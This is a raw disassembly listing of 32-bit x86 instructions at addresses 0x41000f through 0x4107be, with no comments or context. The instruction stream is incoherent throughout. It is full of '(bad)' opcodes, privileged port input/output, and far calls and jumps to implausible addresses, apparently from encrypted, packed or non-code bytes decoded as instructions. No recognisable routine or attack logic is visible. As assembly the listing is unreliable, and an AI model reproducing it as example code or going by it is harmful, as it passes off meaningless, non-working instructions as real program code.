  41000f:	aaa    
  410010:	mov    esi,0x2770348f
  410015:	cli    
  410016:	xchg   ebp,eax
  410017:	or     bh,al
  410019:	sbb    al,0x9c
  41001b:	jb     0x41000f
  41001d:	pop    ebx
  41001e:	pusha  
  41001f:	imul   ecx,DWORD PTR [edx+0x29e90736],0x2985e1a2
  410029:	mov    ecx,0x3f3275a4
  41002e:	adc    eax,0x3c1386d2
  410033:	cdq    
  410034:	jle    0x40ffcb
  410036:	addr16 imul esp
  410039:	fdivr  QWORD PTR [edx-0x404b46d]
  41003f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410040:	sbb    BYTE PTR [esi-0x72],al
  410043:	sbb    dh,BYTE PTR [edi]
  410045:	pop    eax
  410046:	jb     0x410072
  410048:	mov    BYTE PTR [ebx-0x74b281d4],cl
  41004e:	in     eax,dx
  41004f:	out    0x1e,eax
  410051:	pop    ecx
  410052:	test   al,0xe0
  410054:	aas    
  410055:	in     eax,0x59
  410057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410058:	and    eax,0xf9f60bcd
  41005d:	xchg   dh,cl
  41005f:	xchg   edx,eax
  410060:	xchg   ecx,eax
  410061:	mov    gs,WORD PTR [edx+0x1f6169c]
  410067:	pushf  
  410068:	add    al,0xa2
  41006a:	ja     0x410026
  41006c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41006d:	mov    al,BYTE PTR [edx]
  41006f:	div    DWORD PTR [edi+0x72]
  410072:	dec    edi
  410073:	int    0x57
  410075:	cmp    eax,0xf31ee3c4
  41007a:	dec    ebx
  41007b:	pcmpeqb mm0,QWORD PTR [eax+0xf]
  41007f:	rcr    DWORD PTR [esi+0x4c1a9dbc],cl
  410085:	stos   DWORD PTR es:[edi],eax
  410086:	push   esp
  410087:	cmc    
  410088:	mul    BYTE PTR [eax-0x4c]
  41008b:	fcomp  st(3)
  41008d:	shl    DWORD PTR [ebx-0x37],1
  410090:	dec    eax
  410091:	fisubr WORD PTR [esp+edi*1-0x41]
  410095:	xchg   esi,eax
  410096:	dec    ecx
  410097:	jns    0x4100c5
  410099:	push   0xffffffd2
  41009b:	push   ebp
  41009c:	and    esi,ebp
  41009e:	cmp    eax,0x81035d0d
  4100a3:	imul   esi,DWORD PTR [eax-0x3f],0x3c6d63e0
  4100aa:	popa   
  4100ab:	adc    BYTE PTR [edi-0x6159e33d],dh
  4100b1:	mov    WORD PTR [ebp+0x25],cs
  4100b4:	test   ecx,ecx
  4100b6:	in     al,dx
  4100b7:	or     edi,DWORD PTR [ecx+edx*8+0x38]
  4100bb:	cmp    DWORD PTR [edx+edx*2],0x48395e7a
  4100c2:	adc    ah,BYTE PTR [ebx-0x64]
  4100c5:	xlat   BYTE PTR ds:[ebx]
  4100c6:	icebp  
  4100c7:	jg     0x41010b
  4100c9:	out    0x6,al
  4100cb:	jnp    0x41010d
  4100cd:	add    ebp,DWORD PTR [esi+0x31]
  4100d0:	adc    ch,al
  4100d2:	adc    bl,dl
  4100d4:	stos   DWORD PTR es:[edi],eax
  4100d5:	pop    eax
  4100d6:	mov    edx,0xdb832f6f
  4100db:	mov    esi,0xa16841fb
  4100e0:	cld    
  4100e1:	in     al,dx
  4100e2:	ret    0x7b03
  4100e5:	pop    edi
  4100e6:	jl     0x4100da
  4100e8:	nop
  4100e9:	loope  0x4100f6
  4100eb:	std    
  4100ec:	cmc    
  4100ed:	(bad)  
  4100ef:	xchg   ebx,eax
  4100f0:	(bad)  
  4100f1:	pop    edx
  4100f2:	add    esp,DWORD PTR [edi+0x39]
  4100f5:	les    edi,FWORD PTR [ecx]
  4100f7:	pop    ecx
  4100f8:	enter  0xc98b,0x38
  4100fc:	inc    eax
  4100fd:	lods   al,BYTE PTR ds:[esi]
  4100fe:	xchg   edi,eax
  4100ff:	adc    bl,BYTE PTR [esi-0x4f]
  410102:	push   edx
  410103:	and    edi,ebx
  410105:	xchg   ebp,eax
  410106:	fst    DWORD PTR [esp+edi*1-0x3b]
  41010a:	loop   0x4100b4
  41010c:	dec    ebp
  41010d:	inc    esi
  41010e:	pop    es
  41010f:	push   es
  410110:	or     DWORD PTR fs:[esi+0x51960cbf],edi
  410117:	frstor [ecx+ebp*4+0xfbc32bd]
  41011f:	iret   
  410120:	nop
  410121:	daa    
  410122:	mov    ebp,0x9263f1de
  410127:	cwde   
  410128:	jmp    0x410187
  41012a:	aaa    
  41012b:	cmp    eax,0xb4d0ea66
  410130:	cmp    al,0xad
  410132:	clc    
  410133:	or     eax,0x7aefb65c
  410138:	nop
  410139:	aad    0x49
  41013b:	sbb    DWORD PTR [eax+0x6bd6efc2],0x4a75caae
  410145:	add    ch,BYTE PTR ds:0x7ef9ab01
  41014b:	pop    es
  41014c:	xchg   ebx,eax
  41014d:	icebp  
  41014e:	scas   al,BYTE PTR es:[edi]
  41014f:	inc    BYTE PTR [edi-0x56058ebf]
  410155:	sub    dl,BYTE PTR [ecx-0x6]
  410158:	sbb    al,0xc0
  41015a:	xchg   esp,eax
  41015b:	fcomp  DWORD PTR [edi+0x751f0aea]
  410161:	and    bl,dl
  410163:	adc    DWORD PTR [ebx],0xffffffc0
  410166:	mov    dl,0x6d
  410168:	jmp    0xf7c0a6f7
  41016d:	out    0x6d,eax
  41016f:	(bad)  
  410170:	sbb    ch,ah
  410172:	mov    edi,0x6990362a
  410177:	jp     0x41014c
  410179:	cwde   
  41017a:	mov    dl,0x6e
  41017c:	or     bh,BYTE PTR [esi+0x5b71a50d]
  410182:	mov    ds:0x366beb28,eax
  410187:	jecxz  0x410128
  410189:	in     al,dx
  41018a:	adc    al,0x68
  41018c:	xchg   esp,eax
  41018d:	ret    
  41018e:	iret   
  41018f:	xor    DWORD PTR [edi],ebp
  410191:	sub    al,0x86
  410193:	out    dx,eax
  410194:	stos   DWORD PTR es:[edi],eax
  410195:	call   0x2f66:0x6eca9b20
  41019c:	adc    eax,DWORD PTR es:[ebx+0x22d3ea2d]
  4101a3:	mov    cl,BYTE PTR [ecx-0x16d51aa4]
  4101a9:	test   BYTE PTR [ebx+eiz*2+0x42a57587],bl
  4101b0:	xor    DWORD PTR [eax-0x11],edi
  4101b3:	cmp    al,0x68
  4101b5:	xor    esp,DWORD PTR [ebp-0x2f489d82]
  4101bb:	imul   ebp,DWORD PTR [ebx+0x5c],0x2bb76b2d
  4101c2:	dec    eax
  4101c4:	mov    ah,0x20
  4101c6:	mov    dh,0x38
  4101c8:	loop   0x410238
  4101ca:	cmc    
  4101cb:	cli    
  4101cc:	pop    es
  4101cd:	les    ebx,FWORD PTR [ecx+0x43df307]
  4101d3:	in     eax,dx
  4101d4:	dec    edx
  4101d5:	add    cl,BYTE PTR [ebx]
  4101d7:	std    
  4101d8:	jbe    0x41023c
  4101da:	adc    eax,DWORD PTR [ebx-0x11]
  4101dd:	or     dh,bh
  4101df:	or     al,0xe9
  4101e1:	ds mov dh,0x5a
  4101e4:	adc    ch,bl
  4101e6:	popf   
  4101e7:	int    0x13
  4101e9:	jge    0x41024e
  4101eb:	mov    dl,BYTE PTR [edi-0x17]
  4101ee:	inc    esi
  4101ef:	(bad)  
  4101f1:	popa   
  4101f2:	out    dx,al
  4101f3:	sbb    al,0xb3
  4101f5:	ds lahf 
  4101f7:	push   ebp
  4101f8:	hlt    
  4101f9:	push   0xc4bcba36
  4101fe:	ja     0x41027e
  410200:	lds    ecx,FWORD PTR [esi+0x29]
  410203:	sahf   
  410204:	(bad)  
  410205:	shl    BYTE PTR [esi],cl
  410207:	daa    
  410208:	(bad)  
  410209:	cwde   
  41020a:	xchg   ebp,eax
  41020b:	xor    edx,DWORD PTR [edi+ebx*8]
  41020e:	cs pop ebp
  410210:	fdivr  QWORD PTR ds:[ebx-0x2b64db6c]
  410217:	inc    ebp
  410218:	aaa    
  410219:	lea    edi,[ebx]
  41021b:	jmp    ecx
  41021d:	jns    0x410296
  41021f:	push   esi
  410220:	jnp    0x410252
  410222:	enter  0x3aab,0xff
  410226:	xchg   esp,eax
  410227:	adc    al,0x74
  410229:	push   cs
  41022a:	xor    ah,BYTE PTR [ecx-0x31d416ac]
  410230:	ds scas al,BYTE PTR es:[edi]
  410232:	xor    al,0xfe
  410234:	sbb    DWORD PTR [ebp-0x3213a9ff],esi
  41023a:	stc    
  41023b:	aaa    
  41023c:	xor    al,0x7c
  41023e:	pop    esp
  41023f:	dec    ebp
  410240:	adc    eax,0xc57b9c15
  410245:	(bad)  
  410246:	mov    ebp,0xc4a26338
  41024b:	loope  0x41024d
  41024d:	imul   ebx,DWORD PTR [esi+0x22],0x44
  410251:	fdiv   DWORD PTR [ebx+0x28]
  410254:	stc    
  410255:	mov    al,ds:0x86bea64d
  41025a:	sbb    eax,0x16581335
  41025f:	sub    eax,0x60d1e8c0
  410264:	push   ebp
  410265:	sub    al,0xaf
  410267:	mov    ch,0x46
  410269:	pop    ds
  41026a:	jmp    DWORD PTR [esi+0x50]
  41026d:	cmp    cl,BYTE PTR [eax+0xf]
  410270:	lahf   
  410271:	mov    es,edx
  410273:	xchg   ebx,eax
  410274:	pusha  
  410275:	push   ss
  410276:	aas    
  410277:	aad    0x9a
  410279:	sbb    ah,BYTE PTR cs:[ebp+0x57a24c2c]
  410280:	iret   
  410281:	pop    ds
  410282:	outs   dx,DWORD PTR ds:[esi]
  410283:	pop    edx
  410284:	cwde   
  410285:	cli    
  410286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410287:	and    ch,bl
  410289:	mov    al,ds:0xd18fe1cb
  41028e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41028f:	sub    al,0x7a
  410291:	sahf   
  410292:	dec    ebp
  410293:	and    DWORD PTR [edi],ebx
  410295:	add    DWORD PTR [esi-0x1c],ebx
  410298:	cld    
  410299:	mov    cl,BYTE PTR [esi]
  41029b:	push   ecx
  41029c:	push   0xc3e68801
  4102a1:	inc    eax
  4102a2:	push   eax
  4102a3:	dec    ecx
  4102a4:	into   
  4102a5:	lea    ebx,[ebx-0x4b4399ea]
  4102ab:	test   DWORD PTR [esi],edx
  4102ad:	fdiv   QWORD PTR [eax]
  4102af:	jl     0x410235
  4102b1:	adc    eax,0xc7b426f3
  4102b6:	pusha  
  4102b7:	sahf   
  4102b8:	je     0x4102b0
  4102ba:	push   0xa352134c
  4102bf:	jns    0x4102c2
  4102c1:	int    0x4a
  4102c3:	inc    ecx
  4102c4:	mov    ch,0xdd
  4102c6:	(bad)  
  4102c7:	sbb    DWORD PTR [ebx+ecx*1],esp
  4102ca:	das    
  4102cb:	and    al,0x24
  4102cd:	cmp    BYTE PTR [ecx+0x330db4f3],ah
  4102d3:	mov    cl,0xe1
  4102d5:	fs mov esi,ds
  4102d8:	cmp    cl,BYTE PTR [eax+0x79]
  4102db:	dec    ecx
  4102dc:	xchg   BYTE PTR [eax+0x6e],ah
  4102df:	and    cl,bl
  4102e1:	stos   BYTE PTR es:[edi],al
  4102e2:	push   0x3a
  4102e4:	outs   dx,BYTE PTR ds:[esi]
  4102e5:	mov    cs,WORD PTR [ebx-0x10]
  4102e8:	ins    DWORD PTR es:[edi],dx
  4102e9:	push   ds
  4102ea:	je     0x4102c1
  4102ec:	pop    esi
  4102ed:	sar    BYTE PTR [esi+0x72d91a74],cl
  4102f3:	jge    0x4102fa
  4102f5:	retf   
  4102f6:	stos   DWORD PTR es:[edi],eax
  4102f7:	jecxz  0x4102b9
  4102f9:	jb     0x4102bf
  4102fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102fc:	push   ecx
  4102fd:	ret    0x1eac
  410300:	jne    0x41033e
  410302:	test   DWORD PTR [edx],0xe8f37552
  410308:	(bad)  
  410309:	stc    
  41030a:	test   al,0x44
  41030c:	xor    eax,0xfcc36555
  410311:	cmp    bh,ch
  410313:	rcr    DWORD PTR [ebx+0x61],1
  410316:	and    bh,cl
  410318:	push   ecx
  410319:	in     eax,dx
  41031a:	jp     0x4102a1
  41031c:	inc    ecx
  41031d:	mov    al,ds:0xebd74cfa
  410322:	pop    eax
  410323:	scas   eax,DWORD PTR es:[edi]
  410324:	sub    bl,BYTE PTR [ebp-0x61f97d2b]
  41032a:	jns    0x41037e
  41032c:	repnz das 
  41032e:	mov    ah,0x8f
  410330:	fnstenv [eax-0x40d1a513]
  410336:	outs   dx,DWORD PTR ds:[esi]
  410337:	(bad)  
  410338:	int3   
  410339:	scas   eax,DWORD PTR es:[edi]
  41033a:	js     0x410356
  41033c:	and    al,0x57
  41033e:	ja     0x4102c3
  410340:	into   
  410341:	mov    ah,cl
  410343:	cmc    
  410344:	pop    eax
  410345:	sub    DWORD PTR [esi+0x3c],edi
  410348:	or     BYTE PTR [ecx-0x43],cl
  41034b:	mov    eax,0x487c9b81
  410350:	stc    
  410351:	dec    eax
  410352:	inc    ecx
  410353:	fnstcw WORD PTR [ecx+0x2436ad98]
  410359:	fwait
  41035a:	and    DWORD PTR [ebp-0x5b],eax
  41035d:	ja     0x4103b9
  41035f:	retf   
  410360:	mov    dl,BYTE PTR [esi+0x6711a69a]
  410366:	dec    esp
  410367:	sti    
  410368:	adc    esi,DWORD PTR [ebx+0x24]
  41036b:	and    DWORD PTR [esi+0x7c],ebp
  41036e:	mov    dl,BYTE PTR [edx-0xe53406a]
  410374:	cmp    BYTE PTR [ebp+0x3d],ah
  410377:	mov    ds:0x11b23a87,eax
  41037c:	hlt    
  41037d:	jp     0x41033e
  41037f:	xchg   ebx,eax
  410380:	fs xor eax,eax
  410383:	cmc    
  410384:	(bad)  
  410385:	(bad)  
  410386:	(bad)  
  410388:	cmp    eax,esi
  41038a:	aaa    
  41038b:	add    al,0xa
  41038d:	out    dx,eax
  41038e:	mov    ch,0x85
  410390:	sub    eax,0x55586fd1
  410395:	xchg   esp,eax
  410396:	fnsave [eax+0x1413ee38]
  41039c:	cli    
  41039d:	retf   
  41039e:	cmp    DWORD PTR ds:0xc0f1fd7a,eax
  4103a4:	inc    ebx
  4103a5:	gs inc edx
  4103a7:	clc    
  4103a8:	loope  0x4103a0
  4103aa:	push   esi
  4103ab:	sbb    ch,BYTE PTR [edi]
  4103ad:	aaa    
  4103ae:	loope  0x410414
  4103b0:	adc    dh,BYTE PTR [ebp-0x69]
  4103b3:	fcomp  QWORD PTR [ecx+esi*4-0x49945edf]
  4103ba:	fisubr WORD PTR [edx+0x1b356b1e]
  4103c0:	js     0x41038b
  4103c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103c3:	push   eax
  4103c4:	fimul  DWORD PTR [edx+0x34]
  4103c7:	stos   DWORD PTR es:[edi],eax
  4103c8:	out    0x90,eax
  4103ca:	pop    ebp
  4103cb:	out    0x67,eax
  4103cd:	mov    bh,0xc7
  4103cf:	ror    ecx,0xb
  4103d2:	je     0x4103b6
  4103d4:	test   BYTE PTR [ebx],dl
  4103d6:	mov    bh,0x9e
  4103d8:	pop    edi
  4103d9:	push   cs
  4103da:	std    
  4103db:	dec    ecx
  4103dc:	std    
  4103dd:	xchg   esi,eax
  4103de:	dec    esp
  4103df:	shr    DWORD PTR [eax+0x7a],cl
  4103e2:	leave  
  4103e3:	rol    BYTE PTR ds:0x872a1814,1
  4103e9:	and    eax,0x18917879
  4103ee:	(bad)  
  4103ef:	jge    0x410389
  4103f1:	call   FWORD PTR [eax-0x6b]
  4103f4:	cli    
  4103f5:	pushfw 
  4103f7:	pop    ds
  4103f8:	cmp    al,BYTE PTR [eax+edi*4+0x38b13bcb]
  4103ff:	xchg   ebx,eax
  410400:	push   eax
  410401:	mov    edi,0x133ee75c
  410406:	push   ecx
  410407:	fs or  eax,0x7627d255
  41040d:	xor    BYTE PTR [edx+0x53e47c2d],bh
  410413:	push   eax
  410414:	mov    esp,0x1b181e1
  410419:	sahf   
  41041a:	and    ah,BYTE PTR [edi]
  41041c:	loope  0x4103a5
  41041e:	push   cs
  41041f:	mov    DWORD PTR [ecx+0x1],edi
  410422:	(bad)  
  410423:	adc    esi,edi
  410425:	daa    
  410426:	(bad)  
  410428:	fmul   DWORD PTR ds:0xa9c24040
  41042e:	and    eax,0x84b24353
  410433:	adc    dh,0x26
  410436:	nop
  410437:	inc    edi
  410438:	in     al,0x9c
  41043a:	push   es
  41043b:	daa    
  41043c:	adc    ch,bl
  41043e:	push   ebp
  41043f:	xlat   BYTE PTR ds:[ebx]
  410440:	addr16 jno 0x41049b
  410443:	sub    DWORD PTR [ebx-0x35],0xffffffc2
  410447:	cld    
  410448:	dec    esp
  410449:	pop    ax
  41044b:	xlat   BYTE PTR ds:[ebx]
  41044c:	jp     0x41041f
  41044e:	mov    ebp,DWORD PTR [esi+0x46]
  410451:	nop
  410452:	sub    esi,DWORD PTR [edi+0x6990e28]
  410458:	es in  al,0x67
  41045b:	mov    ecx,0xbc62cf26
  410460:	or     ebx,DWORD PTR [esi+ebx*2-0x4c]
  410464:	aaa    
  410465:	rcl    DWORD PTR [esi],cl
  410467:	loope  0x4104cc
  410469:	(bad)  
  41046b:	cdq    
  41046c:	cli    
  41046d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41046e:	popf   
  41046f:	add    al,0x68
  410471:	xchg   ecx,eax
  410472:	or     al,0x1a
  410474:	mov    esi,0x55ae9d1b
  410479:	pop    ebp
  41047a:	mov    ecx,ebp
  41047c:	pop    ds
  41047d:	cld    
  41047e:	sbb    ebx,DWORD PTR [ecx]
  410480:	ds popa 
  410482:	mov    esp,0xf3546ec5
  410487:	arpl   bx,bp
  410489:	cli    
  41048a:	test   al,0x3c
  41048c:	repnz stos DWORD PTR es:[edi],eax
  41048e:	lods   al,BYTE PTR es:[esi]
  410490:	jmp    0x8eb78432
  410495:	aam    0x7f
  410497:	adc    dl,BYTE PTR [eax-0x4b963c64]
  41049d:	iret   
  41049e:	add    eax,0x34b44653
  4104a3:	inc    ecx
  4104a4:	std    
  4104a5:	fisttp WORD PTR [ecx-0x6dedfa85]
  4104ab:	out    0x53,al
  4104ad:	pop    esp
  4104ae:	cmp    eax,0x94a5bd29
  4104b3:	sbb    al,0xce
  4104b5:	adc    ebp,eax
  4104b7:	push   edx
  4104b8:	mov    eax,ds:0x3ff856ae
  4104bd:	pop    eax
  4104be:	outs   dx,BYTE PTR ds:[esi]
  4104bf:	in     eax,dx
  4104c0:	xor    dl,BYTE PTR [ebx+edi*8]
  4104c3:	jmp    edi
  4104c5:	dec    ecx
  4104c6:	or     ecx,DWORD PTR [eax-0x12]
  4104c9:	ret    
  4104ca:	inc    edi
  4104cb:	loop   0x410524
  4104cd:	ficom  WORD PTR [esi]
  4104cf:	push   ecx
  4104d0:	stc    
  4104d1:	mov    esp,0x5932bf6e
  4104d6:	rcl    BYTE PTR [edi+0x19],0x34
  4104da:	sub    DWORD PTR [ebx-0x78],edi
  4104dd:	stc    
  4104de:	push   edi
  4104df:	imul   ecx,DWORD PTR [edi],0xffffff8f
  4104e2:	inc    ebx
  4104e3:	mov    eax,0xed8938ac
  4104e8:	nop
  4104e9:	and    BYTE PTR ds:0x66045077,ah
  4104ef:	stos   DWORD PTR es:[edi],eax
  4104f0:	sbb    al,0xc8
  4104f2:	popa   
  4104f3:	adc    esi,DWORD PTR [edx-0xa]
  4104f6:	mov    al,0x37
  4104f8:	sub    BYTE PTR [eax-0x2e81eb65],0x72
  4104ff:	jp     0x41053e
  410501:	addr16 cwde 
  410503:	inc    ebx
  410504:	sbb    BYTE PTR [edi+ecx*8-0x24676e07],dh
  41050b:	or     DWORD PTR ds:0x9cb4caaa,esp
  410511:	adc    edi,edi
  410513:	sbb    DWORD PTR [edx],0x7b1780b
  410519:	xchg   ebp,eax
  41051a:	inc    ebx
  41051b:	les    eax,FWORD PTR [eax+0x22]
  41051e:	shl    ebp,0x13
  410521:	mov    al,BYTE PTR [esi-0x1212b97a]
  410527:	adc    eax,ebx
  410529:	cmp    al,0xb8
  41052b:	xchg   ebp,eax
  41052c:	mov    ecx,0xf657a8ac
  410531:	inc    ebx
  410532:	imul   esp,DWORD PTR [eax+0x26da5eda],0xffffff8c
  410539:	pop    ecx
  41053a:	and    al,BYTE PTR [eax+0x48629374]
  410540:	sbb    bl,BYTE PTR [ebp+edx*2+0x7]
  410544:	jecxz  0x410504
  410546:	dec    edi
  410547:	cmp    DWORD PTR [edi-0xa],0x47de24d9
  41054e:	jmp    0x984ea79b
  410553:	or     edx,ebp
  410555:	outs   dx,BYTE PTR ds:[esi]
  410556:	or     esp,DWORD PTR [ecx-0x71b8d32d]
  41055c:	mov    al,ds:0x2a9728db
  410561:	inc    esi
  410562:	(bad)  
  410563:	mov    dl,0x19
  410565:	mov    ah,0x1a
  410567:	(bad)  
  410569:	dec    ebx
  41056a:	mov    DWORD PTR [ebp+ecx*2-0x61],esp
  41056e:	mov    ah,0xf6
  410570:	xchg   BYTE PTR [eax],bl
  410572:	and    al,0xc7
  410574:	sbb    eax,0xb20ad9f
  410579:	imul   ecx,DWORD PTR [ebx],0x3a
  41057c:	pop    esp
  41057d:	scas   eax,DWORD PTR es:[edi]
  41057e:	jmp    0x7a5e76c
  410583:	leave  
  410584:	sub    BYTE PTR [edx],dh
  410586:	xchg   edi,eax
  410587:	sub    eax,0xa45fc2b4
  41058c:	jg     0x4105a8
  41058e:	out    dx,eax
  41058f:	daa    
  410590:	outs   dx,BYTE PTR ds:[esi]
  410591:	(bad)  
  410592:	out    0x6c,al
  410594:	mov    eax,0xbd661fd6
  410599:	jne    0x41051e
  41059b:	arpl   di,bp
  41059d:	mov    edx,0xfabc7b19
  4105a2:	dec    edx
  4105a3:	dec    ebp
  4105a4:	aad    0x20
  4105a6:	inc    ebp
  4105a7:	mov    esp,0x7fa266d5
  4105ac:	repz call 0x2631:0x1d7fdb8a
  4105b4:	sub    ah,BYTE PTR [ebp+0x58090c4e]
  4105ba:	mov    ah,0x45
  4105bc:	pop    edi
  4105bd:	idiv   BYTE PTR [esi]
  4105bf:	leave  
  4105c0:	xchg   ah,dl
  4105c2:	cmp    bh,BYTE PTR [ebx+0x74]
  4105c5:	jl     0x4105b1
  4105c7:	ficom  WORD PTR [ebx-0x10]
  4105ca:	cld    
  4105cb:	out    0x95,eax
  4105cd:	sar    DWORD PTR [eax+0x54],0x33
  4105d1:	sar    ebx,1
  4105d3:	adc    ah,BYTE PTR [edx+0x44]
  4105d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d7:	push   ebx
  4105d8:	push   ebp
  4105d9:	jecxz  0x4105ff
  4105db:	push   ds
  4105dc:	jecxz  0x4105e8
  4105de:	inc    DWORD PTR ds:0xdb4296cd
  4105e4:	jne    0x4105ee
  4105e6:	and    ebx,edx
  4105e8:	dec    edi
  4105e9:	or     eax,0x9a75ea44
  4105ee:	loope  0x4105a7
  4105f0:	cld    
  4105f1:	repnz aam 0xc3
  4105f4:	test   al,0xfc
  4105f6:	inc    esp
  4105f7:	jg     0x41059a
  4105f9:	inc    esp
  4105fa:	scas   eax,DWORD PTR es:[edi]
  4105fb:	mov    ah,0x91
  4105fd:	pop    ebx
  4105fe:	sahf   
  4105ff:	retf   
  410600:	cmp    BYTE PTR [ebx+0x783cbe0d],bl
  410606:	sbb    esp,ebx
  410608:	sbb    DWORD PTR [edi-0x70f3cc7d],ecx
  41060e:	mov    eax,ds:0x923bef80
  410613:	sbb    DWORD PTR [ebx],esp
  410615:	sbb    esp,DWORD PTR [edi-0x57090ea2]
  41061b:	mov    eax,ds:0x408fc02d
  410620:	jb     0x410688
  410622:	mov    eax,ds:0xb10c6996
  410627:	sbb    eax,0x9cc1a02f
  41062c:	sub    BYTE PTR [edx+0x1],bl
  41062f:	stc    
  410630:	mov    DWORD PTR [esi],ebp
  410632:	push   eax
  410633:	push   ds
  410634:	pop    edi
  410635:	std    
  410636:	push   ecx
  410637:	(bad)  
  410638:	add    eax,0x91cc9de
  41063d:	dec    esp
  41063e:	jl     0x41061f
  410640:	add    BYTE PTR [ebx+0x71e9d0e4],ch
  410646:	xchg   esi,eax
  410647:	add    BYTE PTR [ecx-0x40],dh
  41064a:	out    0x79,eax
  41064c:	loopne 0x4105ef
  41064e:	(bad)  
  410651:	sbb    ecx,ecx
  410653:	pop    ss
  410654:	clc    
  410655:	das    
  410656:	mov    dh,0x8d
  410658:	push   0x89733463
  41065d:	push   eax
  41065e:	lea    ebx,[esi]
  410660:	arpl   WORD PTR [esp+ecx*4],si
  410663:	fst    DWORD PTR [ebx-0x53]
  410666:	loopne 0x4106be
  410668:	jbe    0x410637
  41066a:	ret    
  41066b:	mov    ah,0xc8
  41066d:	pop    edx
  41066e:	xchg   esp,eax
  41066f:	outs   dx,BYTE PTR ds:[esi]
  410670:	fs ja  0x410617
  410673:	inc    eax
  410674:	(bad)  
  410675:	mov    ah,0x5e
  410677:	lock js 0x4106dc
  41067a:	cmp    ebp,esi
  41067c:	je     0x41061e
  41067e:	or     eax,0x220be15d
  410683:	mov    bl,BYTE PTR [edx]
  410685:	xor    edx,ecx
  410687:	loop   0x41068e
  410689:	dec    eax
  41068a:	and    esp,DWORD PTR [ecx+0x5b70cd8e]
  410690:	jmp    0x410657
  410692:	icebp  
  410693:	cdq    
  410694:	fiadd  WORD PTR [eax+0x28]
  410697:	popa   
  410698:	add    esi,esi
  41069a:	out    0x1e,eax
  41069c:	cdq    
  41069d:	cmp    ecx,DWORD PTR [edi-0x36098c43]
  4106a3:	ins    DWORD PTR es:[edi],dx
  4106a4:	addr16 inc ebp
  4106a6:	data16 shl BYTE PTR ds:0xde1429c4,1
  4106ad:	and    cl,bh
  4106af:	xor    al,0xe7
  4106b1:	mov    ebx,0x6515aa77
  4106b6:	add    al,0x39
  4106b9:	adc    BYTE PTR [ecx-0x2bbea6cb],0xbb
  4106c0:	stos   BYTE PTR es:[edi],al
  4106c1:	or     ch,al
  4106c3:	push   ss
  4106c4:	in     eax,0x88
  4106c6:	push   ebp
  4106c7:	pop    ecx
  4106c8:	pop    esi
  4106c9:	inc    ecx
  4106ca:	out    dx,al
  4106cb:	imul   eax,DWORD PTR [edx-0x1a],0x15
  4106cf:	fild   QWORD PTR [eax+0x2a2ec595]
  4106d5:	cmp    bl,BYTE PTR [ecx+0x111414cf]
  4106db:	mov    esi,0x181a7a54
  4106e0:	retf   0x5be7
  4106e3:	(bad)  
  4106e4:	repnz adc al,0x8a
  4106e7:	sahf   
  4106e8:	pop    ds
  4106e9:	add    cl,bh
  4106eb:	nop
  4106ec:	mov    ebp,0xd4426969
  4106f1:	loop   0x4106ee
  4106f3:	mov    ss,WORD PTR [ebx+0x71]
  4106f6:	cmp    bl,BYTE PTR [ecx]
  4106f8:	stos   BYTE PTR es:[edi],al
  4106f9:	cli    
  4106fa:	and    al,0xd5
  4106fc:	and    esi,DWORD PTR [ecx]
  4106fe:	pop    ds
  4106ff:	fcomp  DWORD PTR [esi]
  410701:	in     al,dx
  410702:	jae    0x4106a2
  410704:	int3   
  410705:	loopne 0x41074c
  410707:	arpl   WORD PTR [ebx-0x38],di
  41070a:	in     eax,0xef
  41070c:	push   esi
  41070d:	jl     0x4106fe
  41070f:	mov    al,cl
  410711:	retf   0xa3b9
  410714:	xchg   ebp,eax
  410715:	(bad)  
  410717:	inc    ebp
  410718:	dec    edi
  410719:	nop
  41071a:	ret    0x8fe3
  41071d:	out    dx,eax
  41071e:	adc    esi,eax
  410720:	daa    
  410721:	xchg   edx,eax
  410722:	or     edx,esi
  410724:	dec    edi
  410725:	sub    eax,0x950c8626
  41072a:	leave  
  41072b:	fcom   DWORD PTR [eax]
  41072d:	push   0x78
  41072f:	xor    bh,dh
  410731:	jns    0x4106cf
  410733:	in     eax,0xc1
  410735:	mov    cl,BYTE PTR [edx+0x5efea773]
  41073b:	in     eax,dx
  41073c:	pop    eax
  41073d:	sti    
  41073e:	cwde   
  41073f:	xchg   edi,eax
  410740:	pusha  
  410741:	push   edi
  410742:	adc    DWORD PTR [ecx],0x69867639
  410748:	push   cs
  410749:	push   ebx
  41074a:	imul   esp,esi,0x4e23fe49
  410750:	push   eax
  410751:	xchg   ebp,eax
  410752:	pop    ebx
  410753:	push   ss
  410754:	add    al,0xbd
  410756:	xor    bl,BYTE PTR [esi]
  410758:	jbe    0x41071b
  41075a:	icebp  
  41075b:	xlat   BYTE PTR ds:[ebx]
  41075c:	je     0x410769
  41075e:	or     edi,0xffffffbb
  410761:	adc    eax,0xb7cffbd2
  410766:	inc    ebp
  410767:	fwait
  410768:	inc    ecx
  410769:	xor    ch,BYTE PTR [edx+eax*4]
  41076c:	out    0xc0,al
  41076e:	iret   
  41076f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410770:	in     al,0xe9
  410772:	jge    0x410760
  410774:	sbb    ebx,0xffffffa3
  410777:	inc    ebp
  410778:	stc    
  410779:	push   ds
  41077a:	test   eax,0x7a343baf
  41077f:	out    dx,al
  410780:	push   ecx
  410781:	ret    0x4f8f
  410784:	inc    ebx
  410785:	rcl    DWORD PTR [esi-0x39199607],0xe8
  41078c:	sub    BYTE PTR [ecx],0xb7
  41078f:	loop   0x41077d
  410791:	jp     0x41073a
  410793:	(bad)  
  410794:	mov    bl,0x17
  410796:	iret   
  410797:	adc    BYTE PTR [eax+0x7eb96e8a],0x88
  41079e:	sbb    al,0x22
  4107a0:	stc    
  4107a1:	sbb    ebp,DWORD PTR [ebp-0x3aee64f6]
  4107a7:	cld    
  4107a8:	jb     0x410782
  4107aa:	mov    ds:0x96efac6a,al
  4107af:	dec    ecx
  4107b0:	mov    dl,0x88
  4107b2:	cld    
  4107b3:	mov    ch,0x4c
  4107b5:	mov    ebp,0x6bd348df
  4107ba:	dec    esi
  4107bb:	inc    eax
  4107bc:	mov    ah,0x6e
  4107be:	mov    cl,0x1e
